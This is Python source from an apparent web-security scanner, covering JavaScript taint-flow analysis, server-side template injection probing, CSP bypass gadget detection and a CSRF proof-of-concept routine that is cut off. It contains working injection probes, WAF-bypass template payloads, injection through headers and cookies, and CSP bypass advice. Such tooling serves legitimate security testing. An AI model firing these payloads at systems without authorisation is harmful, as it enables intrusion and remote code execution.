_JS_VAR_DECL_RE = re.compile(r'^(?:var|let|const)\s+([A-Za-z_$][\w$]*)\s*=')


_SEV_ORDER: Dict[str, int] = {"CRIT": 0, "HIGH": 1, "MED": 2, "INFO": 3}
_ALL_SINKS: Tuple[Tuple[str, str, str], ...] = _TAINT_SINKS + _JS_EXTRA_SINKS

@dataclasses.dataclass
class _JsScope:
    name: str
    parent: Optional["_JsScope"]
    vars: Dict[str, str]
    fn_defs: Dict[str, List[str]]
    fn_bodies: Dict[str, str]

def _js_segment(code: str) -> List[Tuple[int, str]]:
    cleaned = re.sub(r'/\*.*-\*/', lambda m: re.sub(r'[^\n]', ' ', m.group()), code, flags=re.DOTALL)
    cleaned = re.sub(r'//[^\n]*', '', cleaned)
    segments: List[Tuple[int, str]] = []
    depth = 0
    in_string: Optional[str] = None
    escape_next = False
    start = 0
    line_no = 1
    seg_line = 1
    i = 0
    n = len(cleaned)
    while i < n:
        ch = cleaned[i]
        if ch == '\n':
            line_no += 1
        if escape_next:
            escape_next = False
            i += 1
            continue
        if in_string:
            if ch == '\\':
                escape_next = True
            elif ch == in_string:
                in_string = None
            i += 1
            continue
        if ch in ('"', "'", '`'):
            in_string = ch
            i += 1
            continue
        if ch in ('(', '[', '{'):
            depth += 1
            i += 1
            continue
        if ch in (')', ']', '}'):
            if depth > 0:
                depth -= 1
            if depth == 0 and ch == '}':
                seg = cleaned[start:i + 1].strip()
                if seg:
                    segments.append((seg_line, seg))
                start = i + 1
                seg_line = line_no
            i += 1
            continue
        if ch == ';' and depth == 0:
            seg = cleaned[start:i + 1].strip()
            if seg:
                segments.append((seg_line, seg))
            start = i + 1
            seg_line = line_no
            i += 1
            continue
        i += 1
    tail = cleaned[start:].strip()
    if tail:
        segments.append((seg_line, tail))
    return segments

def _js_find_body(code: str, start_pos: int) -> str:
    depth = 0
    i = start_pos
    n = len(code)
    in_str: Optional[str] = None
    esc = False
    body_start: Optional[int] = None
    while i < n:
        ch = code[i]
        if esc:
            esc = False
            i += 1
            continue
        if in_str:
            if ch == '\\':
                esc = True
            elif ch == in_str:
                in_str = None
            i += 1
            continue
        if ch in ('"', "'", '`'):
            in_str = ch
            i += 1
            continue
        if ch == '{':
            if body_start is None:
                body_start = i
            depth += 1
        elif ch == '}':
            depth -= 1
            if depth == 0 and body_start is not None:
                return code[body_start + 1: i]
        i += 1
    return ""

def _js_build_scopes(code: str) -> _JsScope:
    root = _JsScope(name="global", parent=None, vars={}, fn_defs={}, fn_bodies={})
    segments = _js_segment(code)
    for _ln, stmt in segments:
        stripped = stmt.lstrip()
        m = _JS_FN_DEF_RE.match(stripped)
        if m:
            fname = m.group(1) or m.group(3)
            params_str = m.group(2) if m.group(1) else m.group(4)
            if fname and params_str is not None:
                params = [p.strip() for p in params_str.split(',') if p.strip()]
                body = _js_find_body(stmt, m.end())
                root.fn_defs[fname] = params
                root.fn_bodies[fname] = body
            continue
        am = _JS_ARROW_DEF_RE.match(stripped)
        if am:
            fname = am.group(1)
            params = [p.strip() for p in am.group(2).split(',') if p.strip()]
            body = _js_find_body(stmt, am.end())
            root.fn_defs[fname] = params
            root.fn_bodies[fname] = body
            continue
        vm = _JS_VAR_DECL_RE.match(stripped)
        if vm:
            vname = vm.group(1)
            if vname not in root.vars and vname not in root.fn_defs:
                root.vars[vname] = ""
    return root

def _js_seed_taint(root_scope: _JsScope, code: str) -> None:
    _extra_compiled = [
        (_JS_ENV_SOURCE_RE,    "env variable"),
        (_JS_URLPARAMS_NEW_RE, "URL params"),
        (_JS_FETCH_RESP_RE,    "fetch response"),
        (_JS_JSONPARSE_RE,     "deserialized JSON"),
        (_JS_ATOB_SOURCE_RE,   "base64 decoded input"),
    ]

    def _seed(pat: object, label: str, is_compiled: bool = False) -> None:
        matches = pat.finditer(code) if is_compiled else re.finditer(pat, code, re.MULTILINE)
        for m in matches:
            surr = code[max(0, m.start() - 120): m.end() + 40]
            var_m = re.search(
                r'(?:var|let|const)\s+([A-Za-z_$][\w$]*)\s*=\s*[^;,\n]{0,80}'
                + re.escape(m.group(0)[:20]),
                surr,
            )
            if var_m:
                vname = var_m.group(1)
                if not root_scope.vars.get(vname):
                    root_scope.vars[vname] = label
            else:
                prop_m = re.search(
                    r'([A-Za-z_$][\w$]*)\s*=\s*[^;,\n]{0,60}' + re.escape(m.group(0)[:12]),
                    surr,
                )
                if prop_m and prop_m.group(1) not in ("if", "while", "for", "return"):
                    vname = prop_m.group(1)
                    if not root_scope.vars.get(vname):
                        root_scope.vars[vname] = label
            root_scope.vars.setdefault("__direct__" + m.group(0)[:40], label)

    for pat, label in _TAINT_SOURCES:
        _seed(pat, label, is_compiled=False)
    for cpat, label in _extra_compiled:
        _seed(cpat, label, is_compiled=True)

    for m in _JS_POSTMSG_LISTENER_RE.finditer(code):
        param = (m.group(1) or "").strip()
        if param:
            root_scope.vars.setdefault(param, "postMessage")

    for m in _JS_WS_MSG_RE.finditer(code):
        param = (m.group(1) or "").strip()
        if param:
            root_scope.vars.setdefault(param, "WebSocket message")

    for key, label in _CROSS_FILE_TAINT.items():
        if ':' in key:
            vname = key.split(':', 1)[1]
            root_scope.vars.setdefault(vname, label + " [imported]")

def _js_propagate(
    root_scope: _JsScope,
    code: str,
    max_passes: int = 6,
    _history: Optional[List] = None,
) -> None:
    if _history is None:
        _history = []

    _KW = frozenset({"if", "while", "for", "return", "else", "true", "false", "null", "undefined"})

    def _is_tainted(name: str) -> bool:
        return bool(root_scope.vars.get(name, ""))

    def _chain(name: str) -> str:
        return root_scope.vars.get(name, "")

    def _mark(dest: str, chain: str, pass_type: str, ln: int) -> bool:
        if dest and dest not in _KW and len(dest) >= 2 and not root_scope.vars.get(dest):
            root_scope.vars[dest] = chain
            _history.append((dest, chain, pass_type, ln))
            return True
        return False

    def _line(pos: int) -> int:
        return code[:pos].count('\n') + 1

    def _san(dest: str, expr: str) -> bool:
        for san in _JS_SANITIZERS:
            if san in expr:
                root_scope.vars[dest] = ""
                return True
        return False

    def _tainted_in(expr: str) -> Optional[Tuple[str, str]]:
        for vname, ch in list(root_scope.vars.items()):
            if not ch or vname.startswith("__direct__") or len(vname) < 2:
                continue
            try:
                if re.search(r'\b' + re.escape(vname) + r'\b', expr):
                    return vname, ch
            except re.error:
                pass
        return None

    changed = True
    for _ in range(max_passes):
        if not changed:
            break
        changed = False

        for m in _ASSIGN_PAT.finditer(code):
            dest, expr = m.group(1), m.group(2)
            if _is_tainted(dest) or _san(dest, expr):
                continue
            hit = _tainted_in(expr)
            if hit and _mark(dest, hit[1] + " via " + hit[0], "A", _line(m.start())):
                changed = True

        for m in _JS_OBJ_PROP_WRITE_RE.finditer(code):
            obj, src = m.group(1), m.group(2)
            if _is_tainted(src) and not _is_tainted(obj):
                if _mark(obj, _chain(src) + " via prop-write", "B", _line(m.start())):
                    changed = True
        for m in _JS_OBJ_PROP_READ_RE.finditer(code):
            dest, obj = m.group(1), m.group(2)
            if _is_tainted(obj) and not _is_tainted(dest):
                if _mark(dest, _chain(obj) + " via prop-read", "B", _line(m.start())):
                    changed = True

        for m in _JS_ARRAY_METHOD_RE.finditer(code):
            dest, src = m.group(1), m.group(2)
            if _is_tainted(src) and not _is_tainted(dest):
                if _mark(dest, _chain(src) + " via array-method", "C", _line(m.start())):
                    changed = True
        for m in _JS_SPREAD_RE.finditer(code):
            dest, src = m.group(1), m.group(2)
            if _is_tainted(src) and not _is_tainted(dest):
                if _mark(dest, _chain(src) + " via spread", "C", _line(m.start())):
                    changed = True

        for m in _JS_TMPL_RE.finditer(code):
            dest = m.group(1)
            hit = _tainted_in(m.group(2))
            if hit and not _is_tainted(dest):
                if _mark(dest, hit[1] + " via template-literal", "D", _line(m.start())):
                    changed = True

        for m in _JS_DESTR_OBJ_RE.finditer(code):
            src = m.group(2)
            if _is_tainted(src):
                for part in m.group(1).split(','):
                    dn = part.strip().split(':')[-1].strip()
                    if dn and _mark(dn, _chain(src) + " via destr-obj", "E", _line(m.start())):
                        changed = True
        for m in _JS_DESTR_ARR_RE.finditer(code):
            src = m.group(2)
            if _is_tainted(src):
                for part in m.group(1).split(','):
                    dn = part.strip()
                    if dn and _mark(dn, _chain(src) + " via destr-arr", "E", _line(m.start())):
                        changed = True

        for m in _JS_FN_CALL_RE.finditer(code):
            dest, fn_name, args_raw = m.group(1), m.group(2), m.group(3)
            if _is_tainted(dest):
                continue
            if any(san in fn_name for san in _JS_SANITIZERS):
                root_scope.vars[dest] = ""
                continue
            hit = _tainted_in(args_raw)
            if hit is None:
                continue
            base_fn = fn_name.split('.')[-1]
            if base_fn in _JS_PASSTHROUGH_FNS or fn_name in _JS_PASSTHROUGH_FNS:
                if _mark(dest, hit[1] + " via passthrough:" + fn_name, "F", _line(m.start())):
                    changed = True
                continue
            if fn_name in root_scope.fn_bodies:
                fbody = root_scope.fn_bodies[fn_name]
                fparams = root_scope.fn_defs.get(fn_name, [])
                mini = _JsScope(
                    name="fn:" + fn_name, parent=root_scope,
                    vars={p: "" for p in fparams}, fn_defs={}, fn_bodies={},
                )
                for idx, arg_tok in enumerate([a.strip() for a in args_raw.split(',')]):
                    if idx < len(fparams):
                        h2 = _tainted_in(arg_tok)
                        if h2:
                            mini.vars[fparams[idx]] = h2[1] + " via arg"
                mini_hist: List = []
                _js_propagate(mini, fbody, max_passes=2, _history=mini_hist)
                for rm in re.finditer(r'\breturn\s+([A-Za-z_$][\w$]*)', fbody):
                    rv = rm.group(1)
                    if mini.vars.get(rv):
                        if _mark(dest, mini.vars[rv] + " via fn:" + fn_name, "F", _line(m.start())):
                            changed = True
                        break

        for m in _JS_AWAIT_RE.finditer(code):
            dest, src = m.group(1), m.group(2)
            if _is_tainted(src) and not _is_tainted(dest):
                if _mark(dest, _chain(src) + " via await", "G", _line(m.start())):
                    changed = True
        for m in _JS_THEN_RE.finditer(code):
            promise_var, cb_param = m.group(1), m.group(2)
            if _is_tainted(promise_var) and not _is_tainted(cb_param):
                if _mark(cb_param, _chain(promise_var) + " via .then", "G", _line(m.start())):
                    changed = True

def _js_find_sink_flows(root_scope: _JsScope, code: str, src_name: str) -> ScanFindings:
    out: ScanFindings = []
    seen: Set[str] = set()
    for sink_pat, sink_label, sev in _ALL_SINKS:
        try:
            csink = re.compile(sink_pat, re.MULTILINE)
        except re.error:
            continue
        for sm in csink.finditer(code):
            ctx = code[max(0, sm.start() - 200): sm.end() + 80]
            matched: Optional[str] = None
            for vname, chain in root_scope.vars.items():
                if not chain:
                    continue
                if vname.startswith("__direct__"):
                    if re.search(re.escape(vname[len("__direct__"):][:12]), ctx):
                        matched = chain + " [direct]"
                        break
                elif len(vname) >= 2:
                    try:
                        if re.search(r'\b' + re.escape(vname) + r'\b', ctx):
                            matched = chain + " -> " + vname
                            break
                    except re.error:
                        pass
            if not matched:
                continue
            ln = code[:sm.start()].count('\n') + 1
            key = (src_name + sink_label + matched)[:120]
            if key in seen:
                continue
            seen.add(key)
            snippet = ctx.replace('\n', ' ').strip()[:160]
            out.append((
                "[" + sev + "] JS taint flow: " + matched + " -> " + sink_label
                + "  in " + src_name + ":" + str(ln),
                snippet,
            ))
            if sink_label in ("innerHTML", "outerHTML", "DOM XSS via innerHTML concatenation"):
                ml = matched.lower()
                if "postmessage" in ml or "websocket" in ml:
                    xkey = "xorigin:" + key
                    if xkey not in seen:
                        seen.add(xkey)
                        out.append((
                            "[CRIT] cross-origin XSS: " + matched + " -> " + sink_label
                            + " (no sanitization)  in " + src_name + ":" + str(ln),
                            snippet,
                        ))
    return out

def _js_topo_sort(import_graph: Dict[str, List[str]], all_files: List[str]) -> List[str]:
    in_deg: Dict[str, int] = {f: 0 for f in all_files}
    for deps in import_graph.values():
        for d in deps:
            if d in in_deg:
                in_deg[d] += 1
    queue = [f for f in all_files if in_deg[f] == 0]
    result: List[str] = []
    visited: Set[str] = set()
    while queue:
        node = queue.pop(0)
        if node in visited:
            continue
        visited.add(node)
        result.append(node)
        for d in import_graph.get(node, []):
            if d in in_deg:
                in_deg[d] -= 1
                if in_deg[d] == 0:
                    queue.append(d)
    for f in all_files:
        if f not in visited:
            result.append(f)
    return result

def _js_is_minified(code: str) -> bool:
    lines = [ln for ln in code.splitlines() if ln.strip()]
    if not lines:
        return False
    longest = max(len(ln) for ln in lines)
    avg = sum(len(ln) for ln in lines) / max(1, len(lines))
    spaces = code.count(" ") + code.count("\n") + code.count("\t")
    density = spaces / max(1, len(code))
    return longest > 900 or avg > 360 or density < 0.08

def _js_minified_fallback_findings(src_name: str, code: str, base: str) -> ScanFindings:
    out: ScanFindings = []
    if not code:
        return out
    compact = code[:250000]
    minified = _js_is_minified(compact)
    has_source = _JS_DIRECT_SOURCE_RE.search(compact) is not None
    has_sink = _JS_DIRECT_SINK_RE.search(compact) is not None
    if _JS_MINIFIED_ASSIGN_RE.search(compact):
        out.append((
            "[HIGH] JS minified fallback: direct DOM sink reads browser-controlled input in " + src_name,
            "pattern=innerHTML/outerHTML from location/referrer/window.name/event.data",
        ))
    elif minified and has_source and has_sink:
        out.append((
            "[MED] JS minified fallback: source and dangerous sink coexist in bundled file " + src_name,
            "source=location/referrer/event/storage sink=innerHTML/eval/fetch/import; scope tracking reduced by minification",
        ))
    if re.search(r'\b(?:eval|Function)\s*\([^)]{0,140}(?:location\.|event\.data|window\.name|document\.referrer)', compact, re.I):
        out.append((
            "[HIGH] JS minified fallback: dynamic code execution uses browser-controlled input in " + src_name,
            "pattern=eval/Function with location/event/referrer/window.name",
        ))
    if re.search(r'\bfetch\s*\([^)]{0,160}(?:location\.|new\s+URLSearchParams|window\.name)', compact, re.I):
        out.append((
            "[MED] JS minified fallback: fetch URL appears influenced by browser-controlled input in " + src_name,
            "pattern=fetch(location/search/hash/window.name)",
        ))
    for sm in _JS_SOURCEMAP_RE.finditer(compact[-5000:]):
        raw_map = sm.group(1).strip().strip('"\'')
        if raw_map and not raw_map.startswith("data:"):
            map_url = urllib.parse.urljoin(src_name if src_name.startswith("http") else base, raw_map)
            out.append(("JS bundle references source map; original source may improve taint accuracy", map_url))
            try:
                mc, _, mb, _ = _req(map_url, use_cache=True, timeout=4.0)
                if mc == 200 and mb:
                    mobj = json.loads(mb[:_GLOBAL_MAX_BODY].decode("utf-8", "ignore"))
                    sources_content = mobj.get("sourcesContent") if isinstance(mobj, dict) else None
                    if isinstance(sources_content, list):
                        joined = "\n".join(str(x) for x in sources_content[:20] if x)
                        if _JS_DIRECT_SOURCE_RE.search(joined) and _JS_DIRECT_SINK_RE.search(joined):
                            out.append((
                                "[MED] JS source map fallback: original sources contain user-input source and dangerous sink",
                                map_url,
                            ))
            except Exception:
                pass
            break
    return out

def scan_js_taint_flow(base: str) -> ScanFindings:
    global _CROSS_FILE_TAINT
    _CROSS_FILE_TAINT = {}
    out: ScanFindings = []
    _done = threading.Event()
    _t0 = time.time()
    _timer = threading.Timer(30.0, _done.set)
    _timer.daemon = True
    _timer.start()
    try:
        c, _, b, _ = _req(base)
        if c == 0:
            return out
        body = b.decode("utf-8", "ignore")
        js_sources = _extract_js_files(base, body)
        file_contents: Dict[str, str] = {name: code for name, code in js_sources}

        import_graph: Dict[str, List[str]] = {name: [] for name in file_contents}
        for fname, fcode in file_contents.items():
            for m in _JS_IMPORT_RE.finditer(fcode):
                dep = m.group(1) or m.group(2) or m.group(3) or ""
                if dep.startswith('.'):
                    dep_key = dep.lstrip('./').replace('.js', '')
                    for known in file_contents:
                        if dep_key in known:
                            import_graph[fname].append(known)
                            break

        ordered = _js_topo_sort(import_graph, list(file_contents.keys()))
        files_done = 0
        all_tainted_vars: Dict[str, str] = {}

        for src_name in ordered:
            if _done.is_set():
                out.append((
                    f"[INFO] JS taint analysis timed out after {time.time() - _t0:.1f}s"
                    f" - {files_done} files analyzed, {len(out)} findings so far",
                    "",
                ))
                break
            code = file_contents.get(src_name, "")
            if not code.strip():
                continue
            out.extend(_js_minified_fallback_findings(src_name, code, base))
            deps = import_graph.get(src_name, [])
            combined = code
            for dep in deps[:2]:
                dep_code = file_contents.get(dep, "")
                if dep_code:
                    combined = "// FILE: " + dep + "\n" + dep_code + "\n// FILE: " + src_name + "\n" + combined
            root_scope = _js_build_scopes(combined)
            _js_seed_taint(root_scope, combined)
            if not any(v for v in root_scope.vars.values()):
                files_done += 1
                continue
            _js_propagate(root_scope, combined)
            findings = _js_find_sink_flows(root_scope, combined, src_name)
            out.extend(findings)
            for vname, chain in root_scope.vars.items():
                if chain and not vname.startswith("__direct__") and len(vname) >= 2:
                    all_tainted_vars[vname] = chain
            for em in _JS_EXPORT_RE.finditer(combined):
                names_raw = em.group(1) or em.group(2) or em.group(3) or ""
                for part in names_raw.split(','):
                    ename = part.strip().split(' ')[-1].split(':')[0].strip()
                    if ename and root_scope.vars.get(ename):
                        _CROSS_FILE_TAINT[src_name + ":" + ename] = root_scope.vars[ename]
            files_done += 1

        if not _done.is_set():
            seen_eh: Set[str] = set()
            for eh_m in _JS_EVENT_HANDLER_RE.finditer(body):
                if _done.is_set():
                    break
                handler_code = eh_m.group(1)
                if not handler_code.strip():
                    continue
                for vname, chain in all_tainted_vars.items():
                    try:
                        if re.search(r'\b' + re.escape(vname) + r'\b', handler_code):
                            ln_b = body[:eh_m.start()].count('\n') + 1
                            ekey = (vname + handler_code[:40])[:80]
                            if ekey not in seen_eh:
                                seen_eh.add(ekey)
                                out.append((
                                    "[HIGH] DOM event handler uses tainted variable '"
                                    + vname + "' (" + chain + ") in "
                                    + eh_m.group(0)[:60] + " on line " + str(ln_b),
                                    handler_code[:120],
                                ))
                            break
                    except re.error:
                        pass

            for ju_m in _JS_JAVASCRIPT_URI_RE.finditer(body):
                uri_code = ju_m.group(1)
                if not uri_code.strip():
                    continue
                mini = _JsScope(name="jsuri", parent=None, vars={}, fn_defs={}, fn_bodies={})
                _js_seed_taint(mini, uri_code)
                if any(v for v in mini.vars.values()):
                    ln_b = body[:ju_m.start()].count('\n') + 1
                    out.append((
                        "[CRIT] javascript: URI with tainted expression on line " + str(ln_b),
                        uri_code[:120],
                    ))
    finally:
        _timer.cancel()

    seen_d: Set[str] = set()
    deduped: ScanFindings = []
    for title, detail in out:
        k = title[:100]
        if k not in seen_d:
            seen_d.add(k)
            deduped.append((title, detail))

    def _sk(item: Tuple[str, str]) -> int:
        for sev, rank in _SEV_ORDER.items():
            if "[" + sev + "]" in item[0]:
                return rank
        return 9

    deduped.sort(key=_sk)
    return deduped[:30]



def scan_ssti_fingerprint(url: str) -> ScanFindings:
    out: ScanFindings = []

    c0, hdrs0, b0, _ = _req(url, use_cache=True)
    if c0 == 0:
        return out
    body0 = b0.decode("utf-8", "ignore")

    a, b_n = random.randint(8001, 9999), random.randint(8001, 9999)
    c_n, d_n = random.randint(8001, 9999), random.randint(8001, 9999)
    while a * b_n == c_n * d_n:
        c_n = random.randint(8001, 9999)
    canary1, canary2 = str(a * b_n), str(c_n * d_n)

    _fmt = dict(a=a, b=b_n, c=c_n, d=d_n, c1=canary1, c2=canary2)

    def _st(s: str) -> str:
        if '{a}' in s or '{c}' in s or '{c1}' in s or '{c2}' in s:
            return s.format_map(_fmt)
        return s

    _FULL_PROBES = [(_st(p1), _st(e1), _st(p2), _st(e2), eng, rce)
                    for p1, e1, p2, e2, eng, rce in _SSTI_PROBE_TEMPLATES]
    _a, _b = str(a), str(b_n)
    _WAF_PROBES: List[Tuple[str, str, str]] = [
        ("{%raw%}{{" + _a + "*" + _b + "}}{%endraw%}",       canary1, "Jinja2 (raw tag)"),
        ("%7B%7B" + _a + "*" + _b + "%7D%7D",                canary1, "Jinja2 (URL-encoded)"),
        ("%257B%257B" + _a + "*" + _b + "%257D%257D",        canary1, "Jinja2 (double URL-encoded)"),
        ("{{" + _a + " \n* \n" + _b + "}}",                  canary1, "Jinja2 (newline bypass)"),
        ("${" + _a + " \n* \n" + _b + "}",                   canary1, "SpEL/Freemarker (newline bypass)"),
        ("{%% set x=" + _a + "*" + _b + " %%}{{x}}",         canary1, "Jinja2 (set tag bypass)"),
        ("{{(" + _a + ").__mul__(" + _b + ")}}",              canary1, "Jinja2 (mul method bypass)"),
        ("{{('" + _a + "'|int)*('" + _b + "'|int)}}",         canary1, "Jinja2 (int filter bypass)"),
        ("#SET($x=" + _a + "*" + _b + ")$x",                 canary1, "Velocity (uppercase SET)"),
        ("${" + _a + "?abs*" + _b + "?abs}",                 canary1, "Freemarker (abs filter bypass)"),
    ]

    def _probe_surface(probe_url: str,
                       method: str = "GET",
                       post_body: Optional[bytes] = None,
                       post_ct: Optional[str] = None,
                       extra_hdrs: Optional[Dict[str, str]] = None,
                       surface_label: str = "param") -> ScanFindings:
        surface_out: ScanFindings = []
        try:
            _, _, base_b, _ = _req(probe_url, method=method,
                                    data=post_body, headers=extra_hdrs or {},
                                    content_type=post_ct)
            base_text = base_b.decode("utf-8", "ignore")
        except Exception:
            base_text = body0

        seen_engines: Set[str] = set()
        for probe, exp1, conf_probe, exp2, engine, rce in _FULL_PROBES:
            if engine in seen_engines:
                continue
            try:
                if method == "GET" and not post_body:
                    if "__SSTI_SLOT__" not in probe_url:
                        continue
                    test_url = probe_url.replace("__SSTI_SLOT__", urllib.parse.quote(probe, safe=""))
                    c1, _, b1, _ = _req(test_url)
                else:
                    c1, _, b1, _ = _req(probe_url, method=method,
                                         data=post_body.replace(b"__SSTI_SLOT__", probe.encode()) if post_body else None,
                                         headers=extra_hdrs or {}, content_type=post_ct)
                t1 = b1.decode("utf-8", "ignore")
                if exp1 not in t1 or exp1 in base_text:
                    continue
                if method == "GET" and not post_body:
                    test_url2 = probe_url.replace("__SSTI_SLOT__", urllib.parse.quote(conf_probe, safe=""))
                    _, _, b2, _ = _req(test_url2)
                else:
                    _, _, b2, _ = _req(probe_url, method=method,
                                        data=post_body.replace(b"__SSTI_SLOT__", conf_probe.encode()) if post_body else None,
                                        headers=extra_hdrs or {}, content_type=post_ct)
                t2 = b2.decode("utf-8", "ignore")
                if exp2 in t2:
                    seen_engines.add(engine)
                    surface_out.append((
                        "[CONFIRMED] SSTI engine=%s surface=%s" % (engine, surface_label),
                        "RCE payload: " + rce,
                    ))
            except Exception:
                pass
        return surface_out

    params = _extract_params(url) or ["template", "name", "view", "msg", "q", "page", "input",
                                       "search", "query", "text", "subject", "title", "content"]
    for param in params[:8]:
        slot_url = _inject_param(url, param, "__SSTI_SLOT__")
        out.extend(_probe_surface(slot_url, surface_label="GET param=" + param))

    _INJECTABLE_HEADERS = [
        "User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP",
        "Accept-Language", "X-Forwarded-Host", "Origin", "X-Custom-Header",
    ]
    _HDR_ENGINES = {"Jinja2", "Twig", "Jinja2/Nunjucks/Twig", "Freemarker/Mako", "Spring SpEL",
                    "Velocity", "ERB/EJS", "Smarty"}
    for hdr_name in _INJECTABLE_HEADERS:
        for probe, exp1, conf_probe, exp2, engine, rce in _FULL_PROBES:
            if engine not in _HDR_ENGINES:
                continue
            try:
                _, _, b1, _ = _req(url, headers={hdr_name: probe})
                t1 = b1.decode("utf-8", "ignore")
                if exp1 in t1 and exp1 not in body0:
                    _, _, b2, _ = _req(url, headers={hdr_name: conf_probe})
                    t2 = b2.decode("utf-8", "ignore")
                    if exp2 in t2:
                        out.append((
                            "[CONFIRMED] SSTI engine=%s surface=header:%s" % (engine, hdr_name),
                            "RCE payload (inject in %s header): %s" % (hdr_name, rce),
                        ))
                        break
            except Exception:
                pass

    _POST_PARAMS = ["name", "message", "template", "subject", "body", "content",
                    "text", "query", "search", "input", "title", "comment", "value"]
    for param in _POST_PARAMS[:6]:
        for probe, exp1, conf_probe, exp2, engine, rce in _FULL_PROBES:
            try:
                body_bytes = ("%s=%s" % (param, urllib.parse.quote(probe))).encode()
                _, _, b1, _ = _req(url, method="POST", data=body_bytes,
                                    content_type="application/x-www-form-urlencoded")
                t1 = b1.decode("utf-8", "ignore")
                if exp1 in t1 and exp1 not in body0:
                    conf_bytes = ("%s=%s" % (param, urllib.parse.quote(conf_probe))).encode()
                    _, _, b2, _ = _req(url, method="POST", data=conf_bytes,
                                        content_type="application/x-www-form-urlencoded")
                    if exp2 in b2.decode("utf-8", "ignore"):
                        out.append((
                            "[CONFIRMED] SSTI engine=%s surface=POST param=%s" % (engine, param),
                            "RCE payload: " + rce,
                        ))
                        break
            except Exception:
                pass

    _JSON_KEYS = ["name", "template", "message", "text", "query", "subject", "content", "value"]
    for key in _JSON_KEYS[:4]:
        for probe, exp1, conf_probe, exp2, engine, rce in _FULL_PROBES:
            try:
                json_body = json.dumps({key: probe}).encode()
                _, _, b1, _ = _req(url, method="POST", data=json_body,
                                    headers={"Content-Type": "application/json"})
                t1 = b1.decode("utf-8", "ignore")
                if exp1 in t1 and exp1 not in body0:
                    json_conf = json.dumps({key: conf_probe}).encode()
                    _, _, b2, _ = _req(url, method="POST", data=json_conf,
                                        headers={"Content-Type": "application/json"})
                    if exp2 in b2.decode("utf-8", "ignore"):
                        out.append((
                            "[CONFIRMED] SSTI engine=%s surface=JSON key=%s" % (engine, key),
                            "RCE payload: " + rce,
                        ))
                        break
            except Exception:
                pass

    existing_cookies = _GLOBAL_HEADERS.get("Cookie", "")
    _COOKIE_NAMES = ["username", "user", "name", "display_name", "lang", "locale", "theme", "session_data"]
    _COOKIE_ENGINES = {"Jinja2", "Twig", "Jinja2/Nunjucks/Twig", "ERB/EJS", "Smarty", "Latte"}
    for cname in _COOKIE_NAMES[:5]:
        for probe, exp1, conf_probe, exp2, engine, rce in _FULL_PROBES:
            if engine not in _COOKIE_ENGINES:
                continue
            try:
                pfx = (existing_cookies + "; ") if existing_cookies else ""
                cookie_val = pfx + "%s=%s" % (cname, urllib.parse.quote(probe))
                _, _, b1, _ = _req(url, headers={"Cookie": cookie_val})
                t1 = b1.decode("utf-8", "ignore")
                if exp1 in t1 and exp1 not in body0:
                    cookie_val2 = pfx + "%s=%s" % (cname, urllib.parse.quote(conf_probe))
                    _, _, b2, _ = _req(url, headers={"Cookie": cookie_val2})
                    if exp2 in b2.decode("utf-8", "ignore"):
                        out.append((
                            "[CONFIRMED] SSTI engine=%s surface=cookie:%s" % (engine, cname),
                            "RCE payload (inject in %s cookie): %s" % (cname, rce),
                        ))
                        break
            except Exception:
                pass

    for param in params[:3]:
        for waf_probe, exp, label in _WAF_PROBES:
            try:
                _, _, wb, _ = _req(_inject_param(url, param, waf_probe))
                wt = wb.decode("utf-8", "ignore")
                if exp in wt and exp not in body0:
                    out.append((
                        "SSTI (%s) via WAF-bypass probe on param %s" % (label, param),
                        "Manual RCE confirmation needed",
                    ))
            except Exception:
                pass

    return out


def scan_csp_bypass_gadgets(base: str) -> ScanFindings:
    out: ScanFindings = []
    c, h, b, _ = _req(base)
    if c == 0:
        return out
    csp_raw = h.get("content-security-policy", "")
    if not csp_raw:
        meta_m = re.search(r'<meta[^>]+http-equiv=["\']content-security-policy["\'][^>]*content=["\']([^"\']+)["\']',
                           b.decode("utf-8", "ignore"), re.IGNORECASE)
        if meta_m:
            csp_raw = meta_m.group(1)
    if not csp_raw:
        return out

    script_src_m = re.search(r'script-src([^;]+)', csp_raw, re.IGNORECASE)
    default_src_m = re.search(r'default-src([^;]+)', csp_raw, re.IGNORECASE)
    src_raw = (script_src_m or default_src_m)
    if not src_raw:
        return out
    allowed_origins: List[str] = re.findall(r'https?://([A-Za-z0-9.\-]+)', src_raw.group(1))
    wildcard_domains: List[str] = re.findall(r'\*\.([A-Za-z0-9.\-]+)', src_raw.group(1))

    for allowed in allowed_origins:
        if allowed in _CSP_JSONP_GADGETS:
            for path in _CSP_JSONP_GADGETS[allowed]:
                probe = "https://" + allowed + path
                pc, _, pb, _ = _req(probe, timeout=6.0)
                body_str = pb.decode("utf-8", "ignore")
                if pc == 200 and ("callback(" in body_str or re.search(r'[a-zA-Z_$]\w*\s*\(', body_str[:120])):
                    out.append((
                        "CSP bypass gadget: JSONP on whitelisted origin " + allowed,
                        "<script src=\"" + probe + "\"></script>  -- executes in " + base + " origin",
                    ))
                    break

    for wc in wildcard_domains:
        out.append((
            "CSP wildcard domain: *." + wc + " -- attacker can register subdomain."+wc+" to bypass script-src",
            "Register subdomain, host malicious JS, CSP allows it",
        ))

    unsafe = []
    if "'unsafe-inline'" in csp_raw:
        unsafe.append("'unsafe-inline'")
    if "'unsafe-eval'" in csp_raw:
        unsafe.append("'unsafe-eval'")
    if unsafe:
        out.append(("CSP contains " + " + ".join(unsafe) + " in script-src -- CSP trivially bypassed", csp_raw[:160]))

    return out

def scan_csrf_poc(base: str) -> ScanFindings:
    out: ScanFindings = []
    c, h, b, _ = _req(base)
    if c == 0:
        return out
    body = b.decode("utf-8", "ignore")
    form_pat   = re.compile(r'<form\b([^>]*)>(.*?)</form>', re.IGNORECASE | re.DOTALL)
    input_pat  = re.compile(r'<input\b([^>]*)>', re.IGNORECASE)
    attr_pat   = re.compile(r'(\w[\w-]*)\s*=\s*["\']([^"\']*)["\']')
    csrf_names = re.compile(r'csrf|token|nonce|authenticity|xsrf|_wpnonce', re.IGNORECASE)
    poc_count  = 0
    for m in form_pat.finditer(body):
        form_attrs_raw, form_body = m.group(1), m.group(2)
        form_attrs = dict(attr_pat.findall(form_attrs_raw))
        method = form_attrs.get("method", "get").upper()
        if method != "POST":
            continue
        action = form_attrs.get("action", base).strip()
        if not action.startswith("http"):
            action = urllib.parse.urljoin(base, action)
        fields: Dict[str, str] = {}
        has_csrf_token = False
        for inp in input_pat.finditer(form_body):
            iattrs = dict(attr_pat.findall(inp.group(1)))
            name  = iattrs.get("name", "")
            itype = iattrs.get("type", "text").lower()
            val   = iattrs.get("value", "")
            if not name:
                continue
            if csrf_names.search(name):
                has_csrf_token = True
                break
            if itype not in ("submit", "button", "reset", "image", "file"):
